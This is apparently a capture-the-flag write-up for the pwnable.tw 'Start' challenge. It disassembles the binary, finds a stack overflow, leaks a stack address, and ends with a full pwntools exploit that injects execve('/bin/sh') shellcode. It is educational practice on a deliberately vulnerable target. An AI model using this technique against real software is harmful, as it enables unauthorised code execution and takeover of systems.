---
title: pwnable.tw Start
date: 2025-2-21
categories: [pwnableTW, writeup]
---

# Problem

> Just a start.<br>
<br>
Don't know how to start?<br>
Check [GEF 101 - Solving pwnable.tw/start](https://www.youtube.com/watch?v=KWG7prhH-ks) by [@\_hugsy](https://twitter.com/_hugsy_)

- `start`: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped

# Recon

Open the binary in binary ninja, the `_start()` function is simple, only contains 22 instructions.

```
08048060    int32_t _start()
--------------------------------------------------------------------
08048060  54                 push    esp {__return_addr} {var_4}
08048061  689d800408         push    _exit {var_8}
08048066  31c0               xor     eax, eax  {0x0}
08048068  31db               xor     ebx, ebx  {0x0}
0804806a  31c9               xor     ecx, ecx  {0x0}
0804806c  31d2               xor     edx, edx  {0x0}
0804806e  684354463a         push    0x3a465443 {var_c}
08048073  6874686520         push    0x20656874 {var_10}
08048078  6861727420         push    0x20747261 {var_14}
0804807d  6873207374         push    0x74732073 {var_18}
08048082  684c657427         push    0x2774654c {var_1c}
08048087  89e1               mov     ecx, esp {var_1c}
08048089  b214               mov     dl, 0x14
0804808b  b301               mov     bl, 0x1
0804808d  b004               mov     al, 0x4
0804808f  cd80               int     0x80
08048091  31db               xor     ebx, ebx  {0x0}
08048093  b23c               mov     dl, 0x3c
08048095  b003               mov     al, 0x3
08048097  cd80               int     0x80
08048099  83c414             add     esp, 0x14
0804809c  c3                 retn    
```

Which in pseudo C is:

```c
int _start() {
    char buf[0x14] = "Let\'s start the CTF:";
    write(1, buf, 0x14);
    read(0, buf, 0x3c);
}
```

# Exploit

## Buffer Overflow

The `read` function can results in stack buffer overflow to override `$ebp`, after sending pattern using pwntools, the program receive `SIGSEGV` at `0x66666666`, which is `ffff`, hence the padding is 20 and we have a arbitrary jump.

```python
# template with $ pwn template --host chall.pwnable.tw --port 10000 start

io.sendafter(b"Let's start the CTF:", b"aaaabbbbccccddddeeeeffffgggghhhh")
```

![alt text]({{site.baseurl}}/assets/images/pwnable-tw-Start/ebp-padding.png)

## Where to Jump

Since NX is disabled, we can write shellcode to stack and then jump to stack to get shell.

![alt text]({{site.baseurl}}/assets/images/pwnable-tw-Start/checksec.png)

## Leak stack Address

However the stack address is randomized every time, to leak the stack address we need some lind of print function, fortunately the gadget at `0x08048087` is `write(1, $esp, 0x14); read(0, $esp, 0x3c);`{:.c}, it will print out the value at `$esp` and get another chance to overflow $ebp. Using the following script and setting breakpoint at `0x804808f` (`write()`), we can find that `buf`, refer as `buf1`, is at `leak - 0x1c` and the fake buffer of the second `write()`, refer as `buf2`, is at `leak - 0x4`

```python
io.sendafter(b"Let's start the CTF:", b"a" * 20 + p32(0x8048087))
leak = u32(io.recv(4))
log.info(f"{leak = :#0x}")
```

![alt text]({{site.baseurl}}/assets/images/pwnable-tw-Start/buf1_address.png)
![alt text]({{site.baseurl}}/assets/images/pwnable-tw-Start/buf2_address.png) <br>
![alt text]({{site.baseurl}}/assets/images/pwnable-tw-Start/leak_stack.png)

## Get Shell

The program flow we want to achieve is:
1. jump back the `write()`: first buffer overflow
2. leak stack address: write gadget
3. put shellcode on stack: second `read()`
4. jump to shellcode: second buffer overflow
5. get shell, PWN!!!

However, for step 3 the shortest shell code for `execve("/bin/sh")` is 23 bytes, which is longer than the 20 bytes buffer, notice that the first `read()` isn't used and we also know the address of `buf1`, therefore it is a good place to put `"/bin/sh"`. The final exploit is as follow:

```python
io = start()

io.sendafter(b"Let's start the CTF:", b"/bin/sh\x00" + b"a" * 12 + p32(0x8048087))
leak = u32(io.recv(4))
log.info(f"{leak = :#0x}")
buf1 = leak - 0x1c
log.info(f"{buf1 = :#0x}")
buf2 = leak - 0x4
log.info(f"{buf2 = :#0x}")

shellcode = asm(f"""
                mov eax, 0xb
                mov ebx, {hex(buf1)}
                xor ecx, ecx
                xor edx, edx
                int 0x80
                """)
log.info(f"shellcode lenght: {len(shellcode)}")
io.send(shellcode + b"\x90" * (20 - len(shellcode)) + p32(buf2))

io.interactive()
```
